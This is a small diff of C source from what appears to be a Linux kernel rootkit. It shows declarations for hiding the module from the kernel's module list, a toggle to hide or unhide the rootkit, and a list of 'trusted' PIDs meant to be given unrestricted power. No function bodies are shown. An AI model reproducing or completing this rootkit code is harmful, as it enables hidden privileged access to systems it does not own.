@@ -9,15 +9,15 @@ extern int BUFFER_SIZE;
 
 bool module_hidden = false;
 static struct list_head *prev_module; //location of the previous module
-struct trusted_pid_node_t; //linked list to store the PID for the list of PIDs that can do anything //CHECK can the PID var from regs be modified?
-struct trusted_pid_node_t* trusted_pid_head; //head of linked list
+//struct trusted_pid_node_t; //linked list to store the PID for the list of PIDs that can do anything //CHECK can the PID var from regs be modified?
+//struct trusted_pid_node_t *trusted_pid_head; //head of linked list
 
 //pid functions
 static int init_trusted_pid_head(void); //initiates the head node of the list
 static int trust_pid(int pid); //adds pid to trusted pid list
 static int untrust_pid(int pid); //removes pid from trusted pid list
 static bool check_pid_trusted(int pid); //checks if a pid is in list
-static int list_trusted_pids(void); //logs all of the trusted pids
+static int list_trusted_pids(char *buffer); //logs all of the trusted pids
 
 //generic functions
 static int hide_rootkit(bool); //function to unhide\hide the rootkit
